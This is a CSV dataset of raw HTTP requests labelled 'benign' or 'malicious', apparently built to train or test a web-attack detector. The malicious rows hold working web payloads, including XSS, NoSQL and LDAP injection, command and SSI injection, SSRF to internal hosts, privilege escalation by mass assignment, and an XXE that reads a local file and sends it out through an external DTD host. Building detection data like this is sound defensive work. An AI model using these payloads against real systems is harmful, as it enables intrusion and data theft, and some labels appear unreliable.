label,text
benign,"GET /topic/technology-smartdevices-updates?page=3 HTTP/1.1
Host: chatterbox-community.io
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Referer: https://chatterbox-community.io/topic/technology-smartdevices-updates?page=2
Cookie: sessionid=9d7365ab72f4ef7a2bcd894312fb9281; logged_in=yes
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36"
benign,"GET /forums/thread/8791/weekly-gaming-news-discussion HTTP/1.1
Host: consolegamersforum.biz
Connection: keep-alive
Accept: text/html
Referer: https://consolegamersforum.biz/forums/latest
Cookie: cgf_sid=abc8947def3f79123; logged_in=true; theme=light
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.7"
malicious,"GET /user/settings?tab=security HTTP/1.1
Host: encrypted-cloud-vault.xyz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) ""><script>eval(atob('YWxlcnQoJ1NlY3VyaXR5IGJyb3dha2luZycp'))</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"POST /api/v2/authenticate HTTP/1.1
Host: login.api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Content-Length: 67

email=normal.user%00%01%08fake&password=Passw0rd123!&remember_me=true"
malicious,"POST /login HTTP/1.1
Host: cloud-collab-suite.io
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Length: 54
Referer: https://cloud-collab-suite.io/login

username=guest&password=pass123';db.sessions.remove({}); //"
malicious,"POST /user/feedback HTTP/1.1
Host: enterprise-data-systems.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Content-Type: application/xml
Accept: application/xml, text/html, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Content-Length: 219
Connection: keep-alive

<?xml version=""1.0""?>
<!DOCTYPE data [
<!ENTITY xxe_ssrf SYSTEM ""http://127.0.0.1:8080/admin_panel"" >
]>
<feedback>
  <comment>&xxe_ssrf;</comment>
</feedback>"
benign,"POST /api/auth/v3/login HTTP/1.1
Host: users.auth-center.ai
Content-Type: application/json
Accept: application/json
Origin: https://users.auth-center.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
X-Requested-With: FetchAPIClient
Content-Length: 92

{""email"":""nathaniel.green45@users.auth-center.ai"",""password"":""!GreenNV45login""}"
malicious,"GET /link?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: secure-login-portal.co.uk
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Referer: https://secure-login-portal.co.uk/login
Connection: keep-alive"
benign,"POST /forum/topic/post-message HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 175
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cache-Control: max-age=0
Connection: close
Cookie: auth_token=9d5f8ek7pqol2r79akxhvcb

topic_id=531&username=DevMountain&message=%3Cmessage%3ELooking+forward+to+the+upcoming+patch+notes.%3C%2Fmessage%3E"
benign,"POST /forum/api/comments/reply HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Referer: https://community.game-dev-forum.org/thread/80176
Content-Length: 89
Connection: close

{""reply_to_comment_id"":1543,""body"":""Thanks for your detailed input, it really helped clarify things!""}"
benign,"PUT /api/v2/products/4502 HTTP/1.1
Host: api.mega-retailers.net
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.bXl0b2tlbg.QFkT8JxQPxCBYZ4CZ7GjLg
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Content-Length: 178

{""id"":4502,""name"":""UltraSound Wireless Headphones"",""category"":""electronics"",""price"":129.99,""stock"":85,""tags"":[""wireless"",""bluetooth"",""audio""]}"
benign,"GET /search/v2/resources?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: devtools.tech-resources.io
User-Agent: python-requests/2.28.1
Accept: application/json
Accept-Language: en-US,en;q=0.9
X-Forwarded-For: 203.0.113.56
Connection: keep-alive"
benign,"GET /js/utils/interactive-map.js HTTP/1.1
Host: explore-terrain-app.com
User-Agent: Lynx/2.8.9rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/1.1.1k
Accept: application/javascript, */*;q=0.1
Accept-Language: en-GB,en;q=0.5
DNT: 1
Cache-Control: no-cache
Connection: keep-alive"
malicious,"POST /blog/article/comment HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Referer: https://my-personal-blog-site.info/blog/article/view?id=123
Cookie: auth=xyz987abc654
Content-Length: 79

comment=Nice+post!%0aid%0aecho%20Injected%20via%20newline%0als%20-la%20/tmp"
benign,"OPTIONS /api/v1/users/7890 HTTP/1.1
Host: data-secure-api.io
Origin: https://app.client-dashboard.net
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: */*
Connection: keep-alive"
benign,"POST /subscription/upgrade HTTP/1.1
Host: secure-user-portal.net
User-Agent: curl/7.79.1
Content-Type: application/json
Accept: */*
X-CSRF-Token: 8ef30a1bbc7d528f
Content-Length: 38
Connection: keep-alive

{""plan"":""ultra-premium-pro-max-v9""}"
benign,"POST /as/token HTTP/1.1
Host: identity-authentication-center.dev
Content-Type: application/x-www-form-urlencoded
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Authorization: Basic SUQtQVVUSDo0NjMwYmQxZi1mZWMyLTQ1ZjItYmU3OC04OWRhNjYzMzkwNzc=
Accept: application/json
Content-Length: 134
Connection: close

grant_type=refresh_token&refresh_token=dU5CdThxNmNkVTFNNVhGRkVVc0c5dEhHYlc4WmZpZHNjVmhIQm1mR21jMg==&client_id=ID-AUTH&client_secret=4630bd1f-fec2-45f2-be78-89da66339077&redirect_uri=https%3A%2F%2Fidentity-authentication-center.dev%2Fdashboard"
benign,"POST /community/discussions/new HTTP/1.1
Host: devtalks-webhub.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 187
Connection: keep-alive
Cookie: session_sid=34f90a12b8571c0d

forum_post=Hi+everyone%2C+I+am+trying+to+understand+how+to+use+the+%3Cdiv%3E+tag+in+HTML.+Should+I+select+it+with+document.getElementById%28%27container%27%29+or+use+querySelector%3F"
benign,"GET /api/v2/order/history/98031 HTTP/1.1
Host: quickorderservice.xyz
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiamFuZWRvZSJ9.BYJq4Aj6cdoIPkMdTc3K7pF6Xkg7wb2v55liKcgN0-I
User-Agent: Python-urllib/3.11
Accept-Language: en-US,en;q=0.9
Connection: close"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json
Content-Type: application/json
Cache-Control: no-cache
Content-Length: 77
Connection: keep-alive
Cookie: authid=8fa1e736f4124640ae211f0812bbecf6

{""redirectUrl"": ""http://0x7F000001/admin-panel?mode=edit&user=12345""}"
benign,"PATCH /v1/customer-orders/9b8c7d6e5f4321bc/items/4f2a1b8 HTTP/1.1
Host: wholesale.supplies-network.com
Authorization: ApiKey 4hTn8zFG51mWVxZep6YvdLbR9jUQ2XsA
Content-Type: application/json-patch+json
User-Agent: python-requests/2.31.0
Accept: application/json
Connection: close

[
  {""op"": ""test"", ""path"": ""/quantity"", ""value"": 10},
  {""op"": ""replace"", ""path"": ""/quantity"", ""value"": 12}
]"
benign,"GET /api/v1/items/search?query=how%20to%20bake%20bread HTTP/1.1
Host: api.culinary-arts.cloud
User-Agent: python-requests/2.31.0
Accept: application/json
Connection: keep-alive
X-Requested-With: XMLHttpRequest"
benign,"POST /submit/article HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5Z7UqnxGT3GmKyxP
Content-Language: en-US
User-Agent: curl/7.79.1
Accept: */*
Content-Length: 212
Connection: keep-alive

------WebKitFormBoundary5Z7UqnxGT3GmKyxP
Content-Disposition: form-data; name=""title""

A Day in the Mountains
------WebKitFormBoundary5Z7UqnxGT3GmKyxP
Content-Disposition: form-data; name=""content""

I spent a beautiful day hiking and enjoying fresh air.
------WebKitFormBoundary5Z7UqnxGT3GmKyxP--"
malicious,"POST /api/v2/user/config HTTP/1.1
Host: nexgen-cloud-storage.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Referer: https://partner.nexgen-cloud-storage.ai/controlpanel
Content-Type: application/json
Content-Length: 59
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fakepayload.signature

{""maxUploadSize"":104857600,""enableVersioning"":true,""autoSync"":false}"
benign,"HEAD /media/course/lecture1_hd.mp4 HTTP/1.1
Host: edu-media-library.edu
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.54 Mobile Safari/537.36
Accept: video/mp4,video/webm
Connection: keep-alive"
benign,"POST /app/user/contacts/add HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.88 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
Origin: https://secure-user-portal.net
Content-Length: 98
X-CSRF-Token: b8El4fUvDzhp27OtJhP3GP9z

{""newContacts"":[""anna.karlsson@secure-user-portal.net"",""leo.martinez@secure-user-portal.net""]}"
benign,"POST /member/login HTTP/1.1
Host: services.my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Origin: https://www.my-personal-blog-site.info

login=frankie.hawkins&pass=Freedom2024$&callback=/account/manage/preferences"
benign,"POST /contact/support HTTP/1.1
Host: helpdesk.central-office-support.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
User-Agent: curl/7.81.0
Accept: */*
Connection: keep-alive

feedback=My+SQL+DELETE+statements+were+failing+because+I+missed+the+FROM+keyword+in+the+syntax+section."
malicious,"PUT /api/v1/email/template HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36
Sec-CH-UA: "" Not A;Brand"";v=""99"", ""Chromium"";v=""83"", ""Google Chrome"";v=""83""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Content-Length: 221

{""email_template"":{""subject"":""Hi"", ""body"":""<!--#exec cmd=\""ec\""\""h\"" ' /var/logs/syslog'"" -->""}}"
malicious,"GET /proxy?target=https://internal-db01.corp.local/status HTTP/1.1
Host: api.online-retail-store.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://online-retail-store.biz/home
Connection: close"
benign,"POST /submit/document HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Accept: application/json, text/plain, */*
Referer: https://secure-user-portal.net/upload
Origin: https://secure-user-portal.net
Content-Type: multipart/form-data; boundary=----BoundaryX9UGbOeuL74x9Kw
Content-Length: 733
DNT: 1
Connection: keep-alive

------BoundaryX9UGbOeuL74x9Kw
Content-Disposition: form-data; name=""document""; filename=""meeting_notes.docx""
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document

PK"
benign,"HEAD /downloads/installer.exe HTTP/1.1
Host: secure-file-repo.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Range: bytes=0-0"
benign,"POST /contact/send-message HTTP/1.1
Host: helpdesk.support-center.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
Accept: text/html
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Referer: https://helpdesk.support-center.biz/contact
Connection: keep-alive

fullName=Allen+Dawson&phone=&message=Please+call+me+back+soon."
malicious,"POST /user/link-info HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept: text/html
Referer: https://online-retail-store.biz/dashboard
Content-Length: 49

urlPayload=gopher://internal-redis:6379/_%20%E0%B8%AD%E0%B8%B0%E0%B9%84%E0%B8%A3%E0%B8%81%E0%B9%87%E0%B8%94"
benign,"HEAD /api/status/latest HTTP/1.1
Host: cloudsync-platform.org
User-Agent: Go-http-client/1.1
Accept: application/json
Connection: keep-alive"
malicious,"POST /api/user/filter HTTP/1.1
Host: data-access-portal.site
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 56

user_id=validuser%29%28objectClass%3D*%29&attributes=%2A"
malicious,"POST /xml/api/submit HTTP/1.1
Host: data-sync-warehouse.ai
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/xml
Content-Length: 298
Connection: keep-alive

<!DOCTYPE data [
  <!ENTITY % file SYSTEM ""file:///etc/hostname"">
  <!ENTITY % ext SYSTEM ""http://secure-dataflow-backend.biz/evil.dtd"">
  %ext;
  %send;
]>
<sync><value>&exfil;</value></sync>"
benign,"POST /articles/submit HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

message=The+UPDATE+statement+allowed+us+to+correct+the+data+without+any+loss+or+errors+in+the+records."
benign,"GET /files/../images/logo.png HTTP/1.1
Host: tech-innovators-lab.org
Accept: image/*,*/*;q=0.9
Accept-Encoding: gzip, deflate, br
User-Agent: curl/7.88.1
Referer: https://tech-innovators-lab.org/projects/ai-development"
benign,"POST /blog/admin/post HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Accept-Encoding: gzip, deflate
Cookie: sessionid=xyz123abc456

title=Update+on+deploy+command&content=All+systems+green."
benign,"GET /api/v1/events?category=music&city=seattle&date=2024-06-10 HTTP/1.1
Host: api.eventify-live.biz
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
Cache-Control: max-age=0"
malicious,"POST /api/users HTTP/1.1
Host: secure-finance-portal.eu
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
X-CSRF-Token: Qf72LIuNwH3dX1kFmRGyzB0aJtYpC9Vx
Accept-Language: en-US,en;q=0.7
Content-Length: 109

{""username"":""financeuser324"",""email"":""financeuser324@secure-finance-portal.eu"",""is_Admin"":true,""plan_id"":""premiumplus"",""account_verified"":true}"
